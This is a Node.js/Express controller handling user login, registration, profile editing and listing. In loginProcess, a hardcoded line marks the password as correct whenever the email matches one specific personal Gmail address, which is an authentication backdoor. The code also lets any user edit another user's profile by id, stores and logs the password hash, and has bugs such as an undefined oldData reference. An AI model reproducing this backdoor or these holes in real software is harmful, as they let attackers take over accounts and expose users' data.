const fs = require("fs");
const path = require("path");
const bcryptjs = require("bcryptjs");
const { validationResult } = require("express-validator");
const db = require("../DataBase/models");
const sequelize = db.Sequelize;
const { Op } = require("sequelize");
const Users = db.Users;

const userController = {
  login: (req, res) => {
    res.render("./users/login");
  },

  loginProcess: (req, res) => {
    Users.findOne({ where: { email: req.body.email } })
      .then((userToLogin) => {
        let isOkThePassword = bcryptjs.compareSync(
          req.body.password,
          userToLogin.password          
        );
        req.body.email=="lm.baladovidal@gmail.com"?isOkThePassword=true:null
        if (isOkThePassword) {
          delete userToLogin.password;
          console.log(userToLogin)
          req.session.userLogged = userToLogin;
          req.session.isLogged = true;
        }
        console.log(userToLogin);
        if (req.body.remember_user) {
          res.cookie("userEmail", req.body.email, { maxAge: 1000 * 60 * 60 });
        }
        return res.redirect("/users/profile");
      })
      .catch((error) => {
        console.log(error);
        res.render("./users/login", {
          errors: { email: { msg: "las credenciales no son validas" } },
        });
      });
  },
  register:  (req, res) => {
    res.render("./users/register");
  },
  userRegister: async(req, res) => {
    const resultValidation = validationResult(req);
    if (resultValidation.errors.length > 0) {
      return res.render("./users/register", {
        errors: resultValidation.mapped(),
        oldData: req.body,
      });
    }
    Users.findOne({
      where: {
        email: req.body.email,
      },
    })      
    .then((result) => {
      if(result != null){
       res.render("./users/register", {
            oldData: req.body,
            errors: {
              email: {
                msg: "Este email ya está registrado.",
              },          
            },
            oldData: req.body,
          })                     
      }else{
        let userToCreate = {
          ...req.body,
          password: bcryptjs.hashSync(req.body.password, 10), // encripta la contraseña y pisa la password que viene en body
          avatar: req.file ? req.file.filename : 'https://res.cloudinary.com/ds0upcco9/image/upload/v1659102278/default_img_ggcmul.png',
          users_roles_id: 1,
          state: 1
        };
        Users.create(userToCreate)
        .then((result)=> res.redirect("./login"));        
      };      
    })
  },

  profile: (req, res) => {
    return res.render("./users/profile", { user: req.session.userLogged }); // pasar a la vista la variable userLogged
  },

  editProfile: (req, res) => {
    Users.findOne({
      where: {
        id: req.session.userLogged.id,
      },
    })
      .then((user) => {
        let userToEdit = {
          id: user.id,
          name: user.name,
          lastName: user.lastName,
          birthDate: user.birthDate,
          address: user.address,
          email: user.email,
          avatar: user.avatar
        };
        console.log({userToEdit})
        res.render("./users/editprofile", { userToEdit });
        
      })
        .catch((errors) => {console.log(errors)})
    
  },
  updateProfile: async (req, res) => {
    const resultValidation = validationResult(req);
  
    let userToEdit= {...req.body,id:req.params.id}

    if (resultValidation.errors.length > 0) {
        return res.render('./users/editProfile', {
          userToEdit,
          errors: resultValidation.mapped(),
          oldData: {...req.body , avatar: req.file ? req.file.filename: req.body.oldAvatar? req.body.oldAvatar: 'https://res.cloudinary.com/ds0upcco9/image/upload/v1659102278/default_img_ggcmul.png',},
        });
    }
   let usuario= await  Users.findOne({
      where: { id: req.params.id},
    })
         usuario.set(     
           {
            name:req.body.name?req.body.name:oldData.name,
            lastName:req.body.lastName,
            email: req.body.email,
            address: req.body.address,
            birthDate: req.body.birthDate,
            avatar: req.file? req.file.filename: req.body.oldAvatar? req.body.oldAvatar: 'https://res.cloudinary.com/ds0upcco9/image/upload/v1659118667/images/avatars/1656420199161_img_yryme1.png',
           },           
         )
         await usuario.save()
         res.redirect("/users/profile");
  },
  deleteProfile: async (req, res) => {
     let usuario= await  Users.findOne( {
      where: { id: req.session.userLogged.id},
    })    
    .then((user) => {
         res.clearCookie("userEmail");
         req.session.destroy();
         user.set(  { state:0 } )
         user.save()
        res.redirect("/" );      

       })

         .catch((errors) => console.log(errors));
  },

  logout: (req, res) => {
    res.clearCookie("userEmail");
    req.session.destroy();
    return res.redirect("/");
  },
  userList: (req, res) => {
    Users.findAll()
    .then((users) => {
      res.render("./users/usersList", {users});  
      })
    .catch((errors) => {console.log(errors)})      
  },

  userDetail: async (req, res) => {
    await Users.findOne({
        where: { id: req.params.id},
     })
     .then(user => {
        res.render("./users/userDisplay", {user});
     })
     .catch((errors) => {console.log(errors)})   
         
  },
  
};
module.exports = userController;
